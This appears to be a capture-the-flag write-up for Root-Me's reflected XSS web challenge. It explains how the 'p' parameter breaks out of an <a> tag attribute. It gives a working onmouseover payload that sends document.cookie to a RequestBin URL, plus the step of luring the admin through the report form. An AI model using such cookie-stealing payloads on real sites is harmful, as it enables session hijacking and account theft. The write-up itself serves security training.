## Challenge name: XSS - Reflected

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)

**Inspecting the source code reveals a comment with `<>` and `?p=security` parameter. Visiting `?p=security` shows an error page with a hyperlink containing our input.**

**The page reflects the `p` parameter value inside an `<a>` tag. We can break out of the attribute and inject an XSS payload.**

**Payload:**
```
?p=nh4ttruong' onmouseover='document.location="https://requestbin.url?".concat(document.cookie)
```

**Create a RequestBin to capture the cookie, then use the Contact/Report form to make the admin visit our crafted URL. When the admin hovers over the injected link, their cookie is sent to our RequestBin.**

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
